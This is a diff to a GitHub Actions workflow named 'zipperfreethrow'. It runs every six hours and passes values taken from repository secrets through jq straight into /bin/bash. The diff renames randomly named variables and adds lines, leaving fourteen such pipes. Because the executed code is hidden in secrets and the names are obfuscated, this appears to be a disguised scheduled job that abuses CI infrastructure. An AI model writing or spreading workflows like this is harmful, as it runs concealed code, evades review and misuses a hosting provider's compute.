@@ -1,24 +1,31 @@
 name: zipperfreethrow
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '43 0/6 * * *'
 
-jobs:  # 29911
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zipperfreethrow
         env:
-          n52496: ${{ secrets.n52496 }}
+          qu2617: ${{ secrets.qu2617 }}
         run: |
-          echo $n52496 | jq -r .v6527 | /bin/bash
-          echo $gfl6 | jq -r .gcfrp38301 | /bin/bash
-          echo $pg9775 | jq -r .gmhmo75 | /bin/bash
-          echo $dnkap809 | jq -r .kcsgo86417 | /bin/bash
-          echo $th2048 | jq -r .hyczy5351 | /bin/bash
-          echo $deu53 | jq -r .r98999 | /bin/bash
-          echo $uoff52 | jq -r .qoskt02 | /bin/bash
+          echo $qu2617 | jq -r .ae909 | /bin/bash
+          echo $rm25 | jq -r .lqs2 | /bin/bash
+          echo $b3 | jq -r .uf3298 | /bin/bash
+          echo $xbbn75 | jq -r .mmfpr9243 | /bin/bash
+          echo $pwxz9154 | jq -r .ehb81 | /bin/bash
+          echo $brv1047 | jq -r .oitb61346 | /bin/bash
+          echo $j4 | jq -r .d02 | /bin/bash
+          echo $jb0746 | jq -r .zt20860 | /bin/bash
+          echo $pcqt37 | jq -r .ws37 | /bin/bash
+          echo $deow32 | jq -r .ow29690 | /bin/bash
+          echo $wolq3595 | jq -r .inbf8599 | /bin/bash
+          echo $zctb6617 | jq -r .wxnjk3820 | /bin/bash
+          echo $k54 | jq -r .ypnq1 | /bin/bash
+          echo $syum97026 | jq -r .rq3 | /bin/bash
 
